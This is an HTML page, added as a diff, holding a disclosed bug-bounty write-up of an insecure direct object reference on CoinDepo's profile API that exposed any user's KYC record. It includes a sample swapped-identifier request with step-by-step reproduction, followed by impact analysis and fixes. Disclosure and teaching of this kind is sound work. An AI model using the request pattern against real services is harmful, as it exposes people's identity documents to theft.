@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>IDOR on CoinDepo: reading any user's KYC through a trusted email field · M1S0</title>
+<meta name="description" content="A profile endpoint chose whose data to return from values in the request instead of who was logged in, exposing any user's full KYC record. Disclosed, Critical, $5,289.">
+<meta property="og:title" content="IDOR on CoinDepo: reading any user's KYC through a trusted email field · M1S0">
+<meta property="og:description" content="A profile endpoint chose whose data to return from values in the request instead of who was logged in, exposing any user's full KYC record. Disclosed, Critical, $5,289.">
+<meta property="og:type" content="article">
+<link rel="icon" href="/favicon.ico" sizes="any">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicon-32.png">
+<link rel="apple-touch-icon" href="/assets/img/favicon-180.png">
+<link rel="alternate" type="application/rss+xml" title="M1S0 · Writeups" href="/feed.xml">
+<meta name="theme-color" content="#0f1115">
+<meta property="og:image" content="https://m1s0-0.github.io/assets/img/og/coindepo-idor.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:site_name" content="M1S0">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://m1s0-0.github.io/assets/img/og/coindepo-idor.png">
+<link rel="canonical" href="https://m1s0-0.github.io/writeups/posts/coindepo-idor.html">
+<meta property="og:url" content="https://m1s0-0.github.io/writeups/posts/coindepo-idor.html">
+
+<link rel="stylesheet" href="/assets/css/site.css">
+</head>
+<body>
+
+<div class="progress"><i></i></div>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <a class="brand" href="/">M1S0</a>
+    <div class="nav-right">
+      <a href="/">Portfolio</a>
+      <a href="/writeups/">All writeups</a>
+    </div>
+  </div>
+</nav>
+
+<nav class="toc" id="toc"></nav>
+
+<article class="article">
+
+  <a class="back" href="/writeups/">&larr; Writeups</a>
+
+  <div id="series"></div>
+
+  <h1 class="title">IDOR on CoinDepo: reading any user's KYC through a trusted email field</h1>
+  <p class="subtitle">One profile endpoint decided whose data to return from values in the request, not from who was logged in. Any authenticated user could pull another user's full KYC record. Reported through HackenProof, rated Critical, rewarded $5,289.</p>
+
+  <div class="author">
+    <span class="avatar" id="byline-avatar"></span>
+    <div>
+      <div class="author-name" id="byline-name"></div>
+    </div>
+  </div>
+
+  <div class="body">
+
+    <p>
+      CoinDepo is a crypto savings and lending platform, so the accounts on it carry
+      real identity data. One of its API endpoints returned a user's full profile and
+      <strong>KYC</strong> record (name, date of birth, phone, address, and links to their uploaded ID documents) based on identifiers sent in the request, without
+      checking that the person asking actually owned that account. Any logged-in user could
+      read any other user's record by changing a single field.
+    </p>
+
+    <p>
+      It was reported through
+      <a href="https://hackenproof.com/reports/CODWADDA-7" rel="noopener">HackenProof</a>,
+      disclosed, rated <strong>Critical</strong>, and rewarded <strong>$5,289</strong>.
+    </p>
+
+    <figure>
+      <img src="/assets/img/writeups/coindepo-idor/00-report-proof.png"
+           alt="The HackenProof report CODWADDA-7 on the CoinDepo program: state Disclosed, severity Critical, category Insecure Direct Object Reference, bounty $5,289">
+      <figcaption>The disclosed report on CoinDepo's HackenProof program: <strong>Critical</strong>, category <strong>Insecure Direct Object Reference</strong>, bounty <strong>$5,289</strong>.</figcaption>
+    </figure>
+
+    <h2>What an IDOR is, in plain terms</h2>
+
+    <p>
+      When you open your profile, your app asks the server: give me my details. The server
+      has to decide <em>whose</em> details to hand back. There is a safe way and an unsafe
+      way to make that decision.
+    </p>
+
+    <ul>
+      <li><strong>Safe:</strong> decide from <em>who you are</em>, the account tied to your logged-in session.</li>
+      <li><strong>Unsafe:</strong> let the <em>request</em> say whose details it wants, and trust it.</li>
+    </ul>
+
+    <p>
+      When the server trusts an identifier in the request (an email, a user id)
+      and returns that person's data without checking it belongs to you, that is an
+      <strong>Insecure Direct Object Reference</strong> (IDOR), also called
+      <strong>Broken Object Level Authorization</strong> (BOLA). You point directly at
+      someone else's object, and nobody checks whether you are allowed to. It is the most
+      common serious API bug there is, and it is exactly what happened here.
+    </p>
+
+    <h2>The endpoint and the flaw</h2>
+
+    <p>
+      The profile page loads through <code>POST /api/details</code>. The request carries
+      several identifier fields in its body (among them <code>email</code>, <code>username</code> and a <code>client_token</code>) and the endpoint returns the profile and KYC record for the account those fields name.
+    </p>
+
+    <div class="callout callout-danger">
+      <strong>The mistake</strong>
+      <p>
+        The endpoint picked the account from the <em>email and identifiers in the request
+        body</em>, rather than from the authenticated session. Nothing on the server checked
+        that the caller owned the account they were asking about. So changing the email to
+        someone else's returned someone else's data.
+      </p>
+    </div>
+
+    <h2>Reproducing it</h2>
+
+    <p>
+      Testing was done with two accounts I created and controlled, so no real user's data
+      was ever touched. The steps:
+    </p>
+
+    <ol class="steps">
+      <li>
+        <h4>Log in with any valid account</h4>
+        <p>Any authenticated account is enough. There is no special role required.</p>
+      </li>
+      <li>
+        <h4>Catch the profile request and change the target</h4>
+        <p>
+          In the email-verification flow the browser sends a request to
+          <code>/api/details</code>. Send it to a proxy like Burp Suite, then change the
+          identifier fields to point at another account.
+        </p>
+        <pre data-file="POST /api/details" data-lang="http"><code>POST /api/details HTTP/2
+Host: app.coindepo.com
+Content-Type: multipart/form-data; boundary=----boundary
+...
+
+------boundary
+Content-Disposition: form-data; name="username"
+
+VICTIM_EMAIL@example.com          &lt;-- the account you want to read
+------boundary
+Content-Disposition: form-data; name="email"
+
+VICTIM_EMAIL@example.com          &lt;-- same here
+------boundary
+Content-Disposition: form-data; name="client_token"
+
+&lt;a valid token from any account&gt;
+------boundary
+Content-Disposition: form-data; name="cdkey"
+
+&lt;request key&gt;
+------boundary--
+</code></pre>
+      </li>
+      <li>
+        <h4>Send it, and read the response</h4>
+        <p>The endpoint answers <code>200 OK</code> with the target account's full record.</p>
+      </li>
+    </ol>
+
+    <figure>
+      <img src="/assets/img/writeups/coindepo-idor/01-request-response.png"
+           alt="Burp Suite showing the request to /api/details on the left with a swapped email, and the response on the right containing the account's name, date of birth, phone, address and ID document paths. The client token and request key are redacted.">
+      <figcaption>Left: the request, with the target's email in the body. Right: the record that came back: name, date of birth, phone, address, and paths to the uploaded ID documents. Both accounts were mine, so the data shown is my own test data.</figcaption>
+    </figure>
+
+    <div class="callout callout-tip">
+      <strong>What is KYC?</strong>
+      <p>
+        <em>Know Your Customer</em>: the identity data a financial platform collects to
+        prove you are who you say: your ID card, a selfie, your address. It is some of the
+        most sensitive data a company ever holds about a person.
+      </p>
+    </div>
+
+    <h2>What came back</h2>
+
+    <p>
+      The response was the account's complete profile. The fields that matter, sanitized:
+    </p>
+
+    <pre data-file="response (excerpt)" data-lang="json"><code>{
+  "user_id": 19090,
+  "email": "VICTIM_EMAIL@example.com",
+  "first_name": "...",
+  "last_name": "...",
+  "date_of_birth": "YYYY-MM-DD",
+  "phone": "+...",
+  "address1": "...",
+  "city": "...",
+  "state": "...",
+  "zip": "...",
+  "document_type": "id-card",
+  "document_photo1": "./uploads/&lt;...&gt;_document_photo1.jpg",
+  "document_photo2": "./uploads/&lt;...&gt;_document_photo2.jpg"
+}
+</code></pre>
+
+    <p>
+      The last two lines are the worst of it: paths to the images of the account holder's
+      government ID. Full name, date of birth, address and a phone number is already enough
+      to impersonate someone; add their ID documents and it becomes a complete identity kit.
+    </p>
+
+    <h2>Proof of concept</h2>
+
+    <figure>
+      <video controls preload="none" playsinline
+             poster="/assets/img/writeups/coindepo-idor/demo-poster.jpg">
+        <source src="/assets/img/writeups/coindepo-idor/demo.mp4" type="video/mp4">
+        Your browser cannot play this video. It shows the request to <code>/api/details</code>
+        being changed to a different account and returning that account's record.
+      </video>
+      <figcaption>The endpoint returning a different account's full profile after only the identifier fields are changed.</figcaption>
+    </figure>
+
+    <h2>Why this is Critical</h2>
+
+    <p>
+      On a financial platform this is not just a privacy leak.
+    </p>
+
+    <ul>
+      <li><strong>Identity theft.</strong> Name, date of birth, address, phone and government-ID images are exactly what is needed to impersonate someone.</li>
+      <li><strong>Account recovery and phishing.</strong> The disclosed data makes credential-recovery attacks and targeted phishing far easier and more convincing.</li>
+      <li><strong>Fraud on money.</strong> On a platform that moves funds, confirmed identity data raises the risk of unauthorized transfers when chained with other weaknesses.</li>
+      <li><strong>Scale.</strong> Because the account was chosen from a request field, this was not one victim: it was anyone whose identifier you supplied.</li>
+    </ul>
+
+    <h2>The fix</h2>
+
+    <p>
+      IDOR is an authorization problem, so the fix is about who the server trusts to name
+      the account:
+    </p>
+
+    <ul>
+      <li>Never trust a client-supplied <code>email</code>, <code>user_id</code> or similar field to decide authorization.</li>
+      <li>Identify the target account only from the authenticated session or token, never from the request body.</li>
+      <li>Enforce an ownership check on the server before returning any profile or KYC data.</li>
+      <li>Return only the fields the client actually needs, not the entire record.</li>
+      <li>Serve document images through short-lived signed URLs with per-user access control, never plain paths.</li>
+      <li>Add automated tests for IDOR / BOLA on every account and identity endpoint.</li>
+    </ul>
+
+    <div class="takeaways">
+      <h3>Key takeaways</h3>
+      <ul>
+        <li>If an endpoint decides whose data to return from a value in the request, assume it can be pointed at someone else until proven otherwise.</li>
+        <li>Authorization must be derived from the session, never from a field the caller controls.</li>
+        <li>The severity of an IDOR is set by what it returns: here, KYC and ID documents, which makes it Critical.</li>
+        <li>Test object-level access on identity endpoints specifically; they are where a leak hurts most.</li>
+      </ul>
+    </div>
+
+    <div class="refs">
+      <h3>References</h3>
+      <ol>
+        <li><a href="https://hackenproof.com/reports/CODWADDA-7" rel="noopener">Disclosed report CODWADDA-7 on HackenProof</a></li>
+        <li><a href="https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/" rel="noopener">OWASP API1:2023 &middot; Broken Object Level Authorization</a></li>
+        <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" rel="noopener">OWASP IDOR Prevention Cheat Sheet</a></li>
+      </ol>
+    </div>
+
+  </div>
+
+</article>
+
+<div class="afoot reveal">
+  <div class="afoot-tags">
+    <span class="chip">IDOR</span>
+    <span class="chip">BOLA</span>
+    <span class="chip">Broken Access Control</span>
+    <span class="chip">API</span>
+    <span class="chip">PII</span>
+  </div>
+  <div class="share">
+    <span>Share</span>
+    <a class="sbtn" id="share-x">on X</a>
+    <button class="sbtn" id="share-copy" type="button">Copy link</button>
+  </div>
+
+  <div id="authorbox"></div>
+
+  <div class="prevnext" id="prevnext"></div>
+
+  <div class="more">
+    <h3>More writeups</h3>
+    <div id="more"></div>
+  </div>
+</div>
+
+<button class="totop" id="totop" type="button" aria-label="Back to top">↑</button>
+
+<script src="/assets/js/data/writeups.js"></script>
+<script src="/assets/js/site.js"></script>
+<script>
+  initArticle({
+    slug:  "coindepo-idor",
+    title: "IDOR on CoinDepo: reading any user's KYC through a trusted email field"
+  });
+</script>
+
+</body>
+</html>
